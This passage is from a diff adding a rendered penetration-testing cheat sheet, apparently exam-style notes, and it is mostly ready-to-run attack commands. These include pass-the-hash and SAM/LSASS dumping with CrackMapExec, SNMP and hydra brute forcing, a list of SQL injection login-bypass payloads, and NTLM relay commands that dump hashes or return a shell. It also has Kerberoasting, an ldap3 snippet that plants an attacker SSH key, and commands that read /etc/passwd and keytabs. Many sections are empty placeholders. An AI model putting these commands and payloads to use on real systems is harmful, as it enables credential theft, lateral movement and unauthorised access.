+crackmapexec smb 192.168.10.11 -u Administrator -H &lt;NTHASH&gt; -x whoami #Pass-the-Hash
+# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}
+
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --sam #Dump SAM
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --sessions #Get sessions (
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --loggedon-users #Get logged-on users
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --disks #Enumerate the disks
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --users #Enumerate users
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --groups # Enumerate groups
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --local-groups # Enumerate local groups
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --pass-pol #Get password policy
+crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --rid-brute #RID brute
+</code></pre>
+<h3 id="dcomexec"><a class="header" href="#dcomexec">dcomexec</a></h3>
+<h3 id="psexec"><a class="header" href="#psexec">psexec</a></h3>
+<h3 id="smbexec"><a class="header" href="#smbexec">smbexec</a></h3>
+<h3 id="wmiexec"><a class="header" href="#wmiexec">wmiexec</a></h3>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="snmp-1"><a class="header" href="#snmp-1">SNMP</a></h1>
+<h2 id="snmpwalk"><a class="header" href="#snmpwalk">snmpwalk</a></h2>
+<pre><code>snmpwalk -c public -v1 $TARGET 1
+snmpwalk -c private -v1 $TARGET 1
+snmpwalk -c manager -v1 $TARGET 1
+</code></pre>
+<h2 id="nmap-2"><a class="header" href="#nmap-2">nmap</a></h2>
+<p>nmap -Pn -sU -p 161 $TARGET --script=</p>
+<pre><code>/usr/share/nmap/scripts/snmp-brute.nse
+/usr/share/nmap/scripts/snmp-hh3c-logins.nse
+/usr/share/nmap/scripts/snmp-info.nse
+/usr/share/nmap/scripts/snmp-interfaces.nse
+/usr/share/nmap/scripts/snmp-ios-config.nse
+/usr/share/nmap/scripts/snmp-netstat.nse
+/usr/share/nmap/scripts/snmp-processes.nse
+/usr/share/nmap/scripts/snmp-sysdescr.nse
+/usr/share/nmap/scripts/snmp-win32-services.nse
+/usr/share/nmap/scripts/snmp-win32-shares.nse
+/usr/share/nmap/scripts/snmp-win32-software.nse
+/usr/share/nmap/scripts/snmp-win32-users.nse
+</code></pre>
+<h2 id="snmp-check"><a class="header" href="#snmp-check">snmp-check</a></h2>
+<pre><code>snmp-check $TARGET -c public
+</code></pre>
+<h2 id="onesixtyone"><a class="header" href="#onesixtyone">onesixtyone</a></h2>
+<pre><code>onesixtyone -c /usr/share/doc/onesixtyone/dict.txt
+</code></pre>
+<h2 id="impacket-1"><a class="header" href="#impacket-1">impacket</a></h2>
+<pre><code>impacket-samdump SNMP $TARGET
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-web-application-enumeration"><a class="header" href="#description-web-application-enumeration">description: Web Application Enumeration</a></h2>
+<h1 id="webapp"><a class="header" href="#webapp">WebApp</a></h1>
+<h2 id="credentials"><a class="header" href="#credentials">Credentials</a></h2>
+<h3 id="bruteforce"><a class="header" href="#bruteforce">Bruteforce</a></h3>
+<pre><code>hydra -L &lt;username list&gt; -P &lt;password list&gt; &lt;Target IPv4/Domain&gt; &lt;method&gt; &quot;&lt;auth area&gt;:&lt;parameters&gt;:&lt;fail message&gt;[:H=COOKIES: security=low; &lt;cookiename&gt;=&lt;cookievalue&gt;]&quot;
+# &lt;parameters&gt; takes form of &quot;username=^USER^&amp;password=^PASS^&amp;login=login&quot;
+</code></pre>
+<h3 id="bypass"><a class="header" href="#bypass">Bypass</a></h3>
+<h4 id="sqli"><a class="header" href="#sqli">SQLi</a></h4>
+<p>?id=1 union select * from &lt;tablename&gt;;</p>
+<p><a href="https://app.gitbook.com/o/0TOzzjcrYPbcpGxxpf2l/s/vkiHJ7wzKS1d2YnfoJ4m/~/changes/kyfU1kkWEwd5E3hQ6qD2/enumeration/webapp/sqli">SQLi</a></p>
+<p>{% content-ref url=&quot;sqli.md&quot; %}
+<a href="enumeration/webapp/sqli.html">sqli.md</a>
+{% endcontent-ref %}</p>
+<h2 id="urls"><a class="header" href="#urls">URLs</a></h2>
+<h3 id="bruteforce-directories"><a class="header" href="#bruteforce-directories">Bruteforce Directories</a></h3>
+<pre><code>feroxbuster -A -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET
+</code></pre>
+<h2 id="page-content"><a class="header" href="#page-content">Page Content</a></h2>
+<h3 id="displayed"><a class="header" href="#displayed">Displayed</a></h3>
+<h3 id="source-code"><a class="header" href="#source-code">Source Code</a></h3>
+<h2 id="response-headers"><a class="header" href="#response-headers">Response Headers</a></h2>
+<pre><code>nikto -host http://$TARGET:80/ -Format txt -output $TARGET.nikto
+</code></pre>
+<h2 id="sitemaps"><a class="header" href="#sitemaps">Sitemaps</a></h2>
+<pre><code>curl -LO http://$TARGET/robots.txt &amp;&amp; curl -LO http://$TARGET/sitemap.xml
+</code></pre>
+<h2 id="administrative-consoles"><a class="header" href="#administrative-consoles">Administrative Consoles</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="wordpress"><a class="header" href="#wordpress">Wordpress</a></h1>
+<h2 id="wordpress-1"><a class="header" href="#wordpress-1">Wordpress</a></h2>
+<pre><code>wpscan --update
+wpscan --url http://${TARGET}:80/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2&gt;&amp;1 | tee &quot;/home/kali/KCP/OSCP/results/${TARGET}/scans/tcp80/tcp_80_http_wpscan.txt&quot;
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sqli-1"><a class="header" href="#sqli-1">SQLi</a></h1>
+<ul>
+<li><code>or 1=1</code></li>
+<li><code>or 1=1--</code></li>
+<li><code>or 1=1#</code></li>
+<li><code>or 1=1/*</code></li>
+<li><code>admin' --</code></li>
+<li><code>admin' #</code></li>
+<li><code>admin'/*</code></li>
+<li><code>admin' or '1'='1</code></li>
+<li><code>admin' or '1'='1'--</code></li>
+<li><code>admin' or '1'='1'#</code></li>
+<li><code>admin' or '1'='1'/*</code></li>
+<li><code>admin'or 1=1 or ''='</code></li>
+<li><code>admin' or 1=1</code></li>
+<li><code>admin' or 1=1--</code></li>
+<li><code>admin' or 1=1#</code></li>
+<li><code>admin' or 1=1/*</code></li>
+<li><code>admin') or ('1'='1</code></li>
+<li><code>admin') or ('1'='1'--</code></li>
+<li><code>admin') or ('1'='1'#</code></li>
+<li><code>admin') or ('1'='1'/*</code></li>
+<li><code>admin') or '1'='1</code></li>
+<li><code>admin') or '1'='1'--</code></li>
+<li><code>admin') or '1'='1'#</code></li>
+<li><code>admin') or '1'='1'/*</code></li>
+<li><code>1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055</code></li>
+<li><code>admin&quot; --</code></li>
+<li><code>admin&quot; #</code></li>
+<li><code>admin&quot;/*</code></li>
+<li><code>admin&quot; or &quot;1&quot;=&quot;1</code></li>
+<li><code>admin&quot; or &quot;1&quot;=&quot;1&quot;--</code></li>
+<li><code>admin&quot; or &quot;1&quot;=&quot;1&quot;#</code></li>
+<li><code>admin&quot; or &quot;1&quot;=&quot;1&quot;/*</code></li>
+<li><code>admin&quot;or 1=1 or &quot;&quot;=&quot;</code></li>
+<li><code>admin&quot; or 1=1</code></li>
+<li><code>admin&quot; or 1=1--</code></li>
+<li><code>admin&quot; or 1=1#</code></li>
+<li><code>admin&quot; or 1=1/*</code></li>
+<li><code>admin&quot;) or (&quot;1&quot;=&quot;1</code></li>
+<li><code>admin&quot;) or (&quot;1&quot;=&quot;1&quot;--</code></li>
+<li><code>admin&quot;) or (&quot;1&quot;=&quot;1&quot;#</code></li>
+<li><code>admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*</code></li>
+<li><code>admin&quot;) or &quot;1&quot;=&quot;1</code></li>
+<li><code>admin&quot;) or &quot;1&quot;=&quot;1&quot;--</code></li>
+<li><code>admin&quot;) or &quot;1&quot;=&quot;1&quot;#</code></li>
+<li><code>admin&quot;) or &quot;1&quot;=&quot;1&quot;/*</code></li>
+<li><code>1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055</code></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="utilities"><a class="header" href="#utilities">Utilities</a></h1>
+<h2 id="links"><a class="header" href="#links">Links</a></h2>
+<h3 id="archival-content"><a class="header" href="#archival-content">Archival Content</a></h3>
+<pre><code>https://web.archive.org/
+https://seclists.org/bugtraq/
+</code></pre>
+<h3 id="deobfuscators"><a class="header" href="#deobfuscators">Deobfuscators</a></h3>
+<pre><code>https://github.com/lelinhtinh/de4js
+https://lelinhtinh.github.io/de4js/
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-ms-ad-enumeration"><a class="header" href="#description-ms-ad-enumeration">description: MS AD Enumeration</a></h2>
+<h1 id="active-directory-1"><a class="header" href="#active-directory-1">Active Directory</a></h1>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise">Most common paths to AD compromise</a></p>
+<p><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</a></p>
+<h2 id="enum4linux-1"><a class="header" href="#enum4linux-1">enum4linux</a></h2>
+<pre><code>enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;DC IP&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;DC IP&gt;
+</code></pre>
+<h2 id="kerberos"><a class="header" href="#kerberos">Kerberos</a></h2>
+<p>{% content-ref url=&quot;kerberos.md&quot; %}
+<a href="enumeration/active-directory/kerberos.html">kerberos.md</a>
+{% endcontent-ref %}</p>
+<h2 id="ldap-38963632683269"><a class="header" href="#ldap-38963632683269">LDAP [389,636,3268,3269]</a></h2>
+<p>{% content-ref url=&quot;ldap.md&quot; %}
+<a href="enumeration/active-directory/ldap.html">ldap.md</a>
+{% endcontent-ref %}</p>
+<h2 id="ntlm"><a class="header" href="#ntlm">NTLM</a></h2>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse">Force NTLM Privileged Authentication</a></p>
+<p><a href="https://github.com/cube0x0/SharpSystemTriggers">https://github.com/cube0x0/SharpSystemTriggers</a></p>
+<h2 id="pbis-open"><a class="header" href="#pbis-open">pbis-open</a></h2>
+<p><a href="https://github.com/BeyondTrust/pbis-open/">https://github.com/BeyondTrust/pbis-open/</a></p>
+<p><code>curl -LO</code> <a href="https://github.com/BeyondTrust/pbis-open/releases/download/9.1.0/pbis-open-9.1.0.551.linux.x86_64.deb.sh"><code>https://github.com/BeyondTrust/pbis-open/releases/download/9.1.0/pbis-open-9.1.0.551.linux.x86_64.deb.sh</code></a>``</p>
+<pre><code>#Read keytab file
+./klist -k /etc/krb5.keytab
+
+#Get known domains info
+./get-status
+./lsa get-status
+
+#Get basic metrics
+./get-metrics
+./lsa get-metrics
+
+#Get users
+./enum-users
+./lsa enum-users
+
+#Get groups
+./enum-groups
+./lsa enum-groups
+
+#Get all kind of objects
+./enum-objects
+./lsa enum-objects
+
+#Get groups of a user
+./list-groups-for-user &lt;username&gt;
+./lsa list-groups-for-user &lt;username&gt;
+#Get groups of each user
+./enum-users | grep &quot;Name:&quot; | sed -e &quot;s,\\\,\\\\\\\,g&quot; | awk '{print $2}' | while read name; do ./list-groups-for-user &quot;$name&quot;; echo -e &quot;========================\n&quot;; done
+
+#Get users of a group
+./enum-members --by-name &quot;domain admins&quot;
+./lsa enum-members --by-name &quot;domain admins&quot;
+#Get users of each group
+./enum-groups | grep &quot;Name:&quot; | sed -e &quot;s,\\\,\\\\\\\,g&quot; | awk '{print $2}' | while read name; do echo &quot;$name&quot;; ./enum-members --by-name &quot;$name&quot;; echo -e &quot;========================\n&quot;; done
+
+#Get description of each user
+./adtool -a search-user --name CN=&quot;*&quot; --keytab=/etc/krb5.keytab -n &lt;Username&gt; | grep &quot;CN&quot; | while read line; do
+    echo &quot;$line&quot;;
+    ./adtool --keytab=/etc/krb5.keytab -n &lt;username&gt; -a lookup-object --dn=&quot;$line&quot; --attr &quot;description&quot;;
+    echo &quot;======================&quot;
+done
+</code></pre>
+<h2 id="poisoning"><a class="header" href="#poisoning">Poisoning</a></h2>
+<p>responder</p>
+<p>inveigh <a href="https://github.com/Kevin-Robertson/Inveigh/releases/latest">https://github.com/Kevin-Robertson/Inveigh/releases/latest</a></p>
+<h3 id="ntlm-relay-only-if-smb-signing-disabled"><a class="header" href="#ntlm-relay-only-if-smb-signing-disabled">NTLM Relay (only if SMB signing disabled)</a></h3>
+<h4 id="forwarding-portbender"><a class="header" href="#forwarding-portbender">forwarding: portbender</a></h4>
+<p>  <a href="https://github.com/praetorian-inc/PortBender/releases/latest">https://github.com/praetorian-inc/PortBender/releases/latest</a></p>
+<h4 id="forwarding-smbrelayxpy"><a class="header" href="#forwarding-smbrelayxpy">forwarding smbrelayx.py</a></h4>
+<pre><code>python3 smbrelayx.py -t smb://&lt;ip_to_attack&gt; -smb2support --no-http-server --no-wcf-server
+# By default it will just dump hashes
+# To execute a command use: -c &quot;ipconfig&quot;
+# To execute a backdoor use: -e &quot;/path/to/backdoor
+
+# Attack through socks proxy
+proxychains python3 ntlmrelayx.py -t smb://&lt;ip_to_attack&gt; -smb2support --no-http-server --no-wcf-server
+</code></pre>
+<h4 id="forwarding-multirelay--usrsharerespondertools"><a class="header" href="#forwarding-multirelay--usrsharerespondertools">forwarding multirelay ( <em><strong>/usr/share/responder/tools)</strong></em></a></h4>
+<pre><code>python MultiRelay.py -t $TARGET -u &lt;user&gt;
+python MultiRelay.py -t &lt;IP target&gt; -u ALL # If &quot;ALL&quot; then all users are relayed
+# By default a shell is returned
+python MultiRelay.py -t &lt;IP target&gt; -u ALL -c whoami #-c to execute command
+python MultiRelay.py -t &lt;IP target&gt; -u ALL -d #-d to dump hashes
+
+# Use proxychains if you need to route the traffic to reach the attacked ip
+</code></pre>
+<h2 id="smb-1"><a class="header" href="#smb-1">SMB</a></h2>
+<p>{% content-ref url=&quot;../services/smb-139-445.md&quot; %}
+<a href="enumeration/active-directory/../services/smb-139-445.html">smb-139-445.md</a>
+{% endcontent-ref %}</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="devices"><a class="header" href="#devices">Devices</a></h1>
+<h2 id="authenticated"><a class="header" href="#authenticated">Authenticated</a></h2>
+<pre><code>ldapsearch -H ldap://&lt;DCIP&gt; -x -LLL -W -D &quot;&lt;user&gt;@&lt;domain&gt;.&lt;tld&gt;&quot; -b &quot;dc=&lt;domain&gt;,dc=&lt;tld&gt;&quot; &quot;(objectclass=computer)&quot; &quot;DNSHostName&quot; &quot;OperatingSystem&quot;
+</code></pre>
+<h2 id="unauthenticated"><a class="header" href="#unauthenticated">Unauthenticated</a></h2>
+<pre><code>nbtscan 192.168.X.0/24
+ntlm-info smb 192.168.X.Y
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="domain"><a class="header" href="#domain">Domain</a></h1>
+<h2 id="current-user-domain-from-powershell"><a class="header" href="#current-user-domain-from-powershell">Current User Domain from Powershell</a></h2>
+<pre><code>$env:USERDNSDOMAIN
+</code></pre>
+<pre><code>(Get-ADDomain).DNSRoot
+</code></pre>
+<h2 id="current-device-domain-from-powershell"><a class="header" href="#current-device-domain-from-powershell">Current Device Domain from Powershell</a></h2>
+<pre><code>(Get-WmiObject Win32_ComputerSystem).Domain
+</code></pre>
+<h2 id="domain-sid-from-powershell"><a class="header" href="#domain-sid-from-powershell">Domain SID from Powershell</a></h2>
+<pre><code class="language-powershell">Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID
+</code></pre>
+<h2 id="nltest"><a class="header" href="#nltest">nltest</a></h2>
+<pre><code>nltest /domain_trusts
+</code></pre>
+<pre><code>nltest /dclist:&lt;domain&gt;
+</code></pre>
+<pre><code>nslookup &lt;DC01.domain.tld&gt;
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="users--groups"><a class="header" href="#users--groups">Users &amp; Groups</a></h1>
+<h2 id="users"><a class="header" href="#users">Users</a></h2>
+<h3 id="domain-joined"><a class="header" href="#domain-joined">Domain Joined</a></h3>
+<h4 id="end-user-accounts"><a class="header" href="#end-user-accounts">End-User Accounts</a></h4>
+<pre><code>net user /domain
+</code></pre>
+<pre><code>Get-ADUser -Filter * | select SamAccountName
+</code></pre>
+<h4 id="computer-accounts"><a class="header" href="#computer-accounts">Computer Accounts</a></h4>
+<pre><code>Get-ADObject -LDAPFilter &quot;objectClass=User&quot; -Properties SamAccountName | select SamAccountName
+</code></pre>
+<h4 id="trust-accounts"><a class="header" href="#trust-accounts">Trust Accounts</a></h4>
+<pre><code>Get-ADUser  -LDAPFilter &quot;(SamAccountName=*$)&quot; | select SamAccountName
+</code></pre>
+<h3 id="not-domain-joined--possess-credentials"><a class="header" href="#not-domain-joined--possess-credentials">Not Domain Joined :: possess credentials</a></h3>
+<p>Lorem</p>
+<h3 id="not-domain-joined--do-not-possess-credentials"><a class="header" href="#not-domain-joined--do-not-possess-credentials">Not Domain Joined :: do not possess credentials</a></h3>
+<p>Lorem</p>
+<h2 id="groups"><a class="header" href="#groups">Groups</a></h2>
+<h3 id="domain-joined-1"><a class="header" href="#domain-joined-1">Domain Joined</a></h3>
+<pre><code>Get-ADGroup -Filter * | select SamAccountName
+</code></pre>
+<h4 id="domain-admins"><a class="header" href="#domain-admins">Domain Admins</a></h4>
+<pre><code>Get-ADGroup &quot;Domain Admins&quot; -Properties members,memberof
+</code></pre>
+<h4 id="remote-desktop"><a class="header" href="#remote-desktop">Remote Desktop</a></h4>
+<pre><code>Get-ADGroup &quot;Remote Desktop Users&quot; -Properties members,memberof
+</code></pre>
+<h4 id="remote-management"><a class="header" href="#remote-management">Remote Management</a></h4>
+<pre><code>Get-ADGroup &quot;Remote Management Users&quot; -Properties members,memberof
+</code></pre>
+<h3 id="not-domain-joined--possess-credentials-1"><a class="header" href="#not-domain-joined--possess-credentials-1">Not Domain Joined :: possess credentials</a></h3>
+<p>Lorem</p>
+<h3 id="not-domain-joined--do-not-possess-credentials-1"><a class="header" href="#not-domain-joined--do-not-possess-credentials-1">Not Domain Joined :: do not possess credentials</a></h3>
+<p>Lorem</p>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-lightweight-directory-access-protocol-enumeration"><a class="header" href="#description-lightweight-directory-access-protocol-enumeration">description: Lightweight Directory Access Protocol Enumeration</a></h2>
+<h1 id="ldap"><a class="header" href="#ldap">LDAP</a></h1>
+<h2 id="ldapdomaindump"><a class="header" href="#ldapdomaindump">ldapdomaindump</a></h2>
+<pre><code>pipx install ldapdomaindump
+ldapdomaindump.py ldap://$TARGET:139
+</code></pre>
+<h2 id="ldapsearch"><a class="header" href="#ldapsearch">ldapsearch</a></h2>
+<p>note ldapsearch can authenticate against kerberos instead of NTLM by passing <code>-Y GSSAPI</code></p>
+<pre><code><strong>#anonymous credential LDAP dump
+</strong><strong>ldapsearch -LLL -x -H ldap:// -b '' -s base '(objectclass=*)'
+</strong>
+#check null credentials
+ldapsearch -x -H ldap://&#x3C;IP> -D '' -w '' -b "DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#check credentials
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#extract users
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#extract computers
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Computers,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#extract my(user) info
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=&#x3C;MY NAME>,CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#extract domain admins
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Domain Admins,CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#extract enterprise admins
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Enterprise Admins,CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#extract admins
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Administrators,CN=Builtin,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#extract remote desktop group
+ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"
+
+#to see if possess credentials for any user listed in above query:
+&#x3C;ldapsearchcmd...> | grep -i -A2 -B2 "userpas"</code></pre>
+<pre><code>ldapsearch -H ldaps://arbitrarycompany.com:636/ -x -s base -b '' &quot;(objectClass=*)&quot; &quot;*&quot; +
+</code></pre>
+<h2 id="nmap-3"><a class="header" href="#nmap-3">nmap</a></h2>
+<pre><code>nmap -n -sV --script &quot;ldap* and not brute&quot; $TARGET
+</code></pre>
+<h2 id="manual-python-enumeration"><a class="header" href="#manual-python-enumeration">Manual Python Enumeration</a></h2>
+<h3 id="basic"><a class="header" href="#basic">Basic</a></h3>
+<pre><code class="language-python">&gt;&gt;&gt; import ldap3
+&gt;&gt;&gt; server = ldap3.Server('$TARGET', get_info = ldap3.ALL, port =636, use_ssl = True)
+&gt;&gt;&gt; connection = ldap3.Connection(server)
+&gt;&gt;&gt; connection.bind()
+True #this means success
+&gt;&gt;&gt; server.info
+[goal is to get naming contexts, e.g., dc=DOMAIN,dc=DOMAIN]
+
+[dump all objects in directory]
+&gt;&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=*))', search_scope='SUBTREE', attributes='*')
+True #this means success
+&gt;&gt; connection.entries
+
+[dump whole ldap]
+&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
+True
+&gt;&gt;&gt; connection.entries
+</code></pre>
+<h3 id="write-data"><a class="header" href="#write-data">Write data</a></h3>
+<pre><code class="language-python">&gt;&gt;&gt; import ldap3
+&gt;&gt;&gt; server = ldap3.Server('$TARGET', port =636, use_ssl = True)
+&gt;&gt;&gt; connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
+&gt;&gt;&gt; connection.bind()
+True #this means success
+&gt;&gt;&gt; connection.extend.standard.who_am_i()
+u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
+&gt;&gt;&gt; connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
+</code></pre>
+<h2 id=""><a class="header" href="#"></a></h2>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-kerberos-enumeration"><a class="header" href="#description-kerberos-enumeration">description: Kerberos Enumeration</a></h2>
+<h1 id="kerberos-1"><a class="header" href="#kerberos-1">Kerberos</a></h1>
+<h2 id="kerberoast"><a class="header" href="#kerberoast">Kerberoast</a></h2>
+<p><a href="https://github.com/ShutdownRepo/targetedKerberoast">https://github.com/ShutdownRepo/targetedKerberoast</a></p>
+<pre><code>./targetedKerberoast.py -d &lt;domain&gt;.&lt;tld&gt; -u &lt;username&gt; -p &lt;password&gt; --dc-ip &lt;DCIP&gt;
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="find-fix-finish"><a class="header" href="#find-fix-finish">Find, Fix, Finish</a></h1>
+<h2 id="find-exploit"><a class="header" href="#find-exploit">Find Exploit</a></h2>
+<h2 id="fix-exploit"><a class="header" href="#fix-exploit">Fix Exploit</a></h2>
+<h2 id="finish-exploit"><a class="header" href="#finish-exploit">Finish Exploit</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-1"><a class="header" href="#windows-1">Windows</a></h1>
+<h2 id="uac"><a class="header" href="#uac">UAC</a></h2>
+<p>get-executionpolicy -list</p>
+<p>set-executionpolicy -scope currentuser Unrestricted</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="enumerate"><a class="header" href="#enumerate">Enumerate</a></h1>
+<h2 id="linux-1"><a class="header" href="#linux-1">Linux</a></h2>
+<p>id &amp;&amp; whoami &amp;&amp; cat /etc/passwd &amp;&amp; uname -a</p>
+<h2 id="windows-2"><a class="header" href="#windows-2">Windows</a></h2>
+<p><a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a></p>
+<p>whoami</p>
+<p>whoami /groups</p>
+<p>whoami /priv</p>
+<p>net /user</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="loot"><a class="header" href="#loot">Loot</a></h1>
+<h2 id="credentials-1"><a class="header" href="#credentials-1">Credentials</a></h2>
+<h2 id="network-access"><a class="header" href="#network-access">Network Access</a></h2>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+    </body>
+</html>
